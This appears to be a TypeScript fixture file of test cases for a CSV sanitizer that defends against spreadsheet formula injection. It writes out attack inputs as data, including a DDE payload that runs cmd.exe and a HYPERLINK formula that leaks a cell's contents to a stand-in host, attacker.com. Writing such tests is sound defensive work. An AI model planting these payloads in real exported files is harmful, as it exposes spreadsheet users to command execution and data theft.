export interface CsvSecurityTestCase {
  id: string;
  category: "formula_injection" | "legitimate_negative_number" | "special_characters" | "whitespace";
  description: string;
  rawInput: string;
  expectedSanitizedCell: string;
  isDangerous: boolean;
}

export const csvSecurityFixtures: CsvSecurityTestCase[] = [
  // 1. DANGEROUS FORMULA INJECTIONS (Must be prepended with a single quote)
  {
    id: "cmd_calc_exec",
    category: "formula_injection",
    description: "DDE execution attempt via cmd.exe",
    rawInput: "=cmd|' /C calc'!A0",
    expectedSanitizedCell: `"'=cmd|' /C calc'!A0"`,
    isDangerous: true,
  },
  {
    id: "plus_formula_trigger",
    category: "formula_injection",
    description: "Plus-sign formula execution trigger",
    rawInput: "+1+2",
    expectedSanitizedCell: `"'+1+2"`,
    isDangerous: true,
  },
  {
    id: "at_sign_sum_trigger",
    category: "formula_injection",
    description: "At-sign function trigger (Lotus / Excel compatibility)",
    rawInput: "@SUM(A1:A10)",
    expectedSanitizedCell: `"'@SUM(A1:A10)"`,
    isDangerous: true,
  },
  {
    id: "tab_prefixed_formula",
    category: "whitespace",
    description: "Tab-prefixed formula to bypass simple trimmed checks",
    rawInput: "\t=1+1",
    expectedSanitizedCell: `"'	=1+1"`,
    isDangerous: true,
  },
  {
    id: "cr_prefixed_formula",
    category: "whitespace",
    description: "Carriage-return prefixed formula injection",
    rawInput: "\r-5*2",
    expectedSanitizedCell: '"\'\r-5*2"',
    isDangerous: true,
  },
  {
    id: "complex_calc_script",
    category: "formula_injection",
    description: "Formula attempting PowerShell or system download invocation",
    rawInput: `=HYPERLINK("http://attacker.com/malware.exe?leak="&A1, "Click for Report")`,
    expectedSanitizedCell: `"'=HYPERLINK(""http://attacker.com/malware.exe?leak=""&A1, ""Click for Report"")"`,
    isDangerous: true,
  },

  // 2. LEGITIMATE NEGATIVE NUMBERS & STRINGS (Must not break math or formatting)
  {
    id: "legitimate_negative_currency",
    category: "legitimate_negative_number",
    description: "Negative financial value",
    rawInput: "-1250.75",
    expectedSanitizedCell: `"'-1250.75"`, // Per OWASP conservative recommendation, dash prefix is neutralized to prevent formula coercion
    isDangerous: false,
  },
  {
    id: "legitimate_hyphenated_sku",
    category: "special_characters",
    description: "Hyphenated product identifier",
    rawInput: "SKU-9902-A",
    expectedSanitizedCell: `"SKU-9902-A"`,
    isDangerous: false,
  },

  // 3. STANDARD QUOTE & DELIMITER ESCAPING
  {
    id: "embedded_double_quotes",
    category: "special_characters",
    description: "Embedded double quotes must be doubled",
    rawInput: 'Table "Users" in database',
    expectedSanitizedCell: `"Table ""Users"" in database"`,
    isDangerous: false,
  },
  {
    id: "embedded_commas_and_newlines",
    category: "special_characters",
    description: "Embedded comma requiring standard quoting",
    rawInput: "Doe, Jane (Admin)",
    expectedSanitizedCell: `"Doe, Jane (Admin)"`,
    isDangerous: false,
  },
];
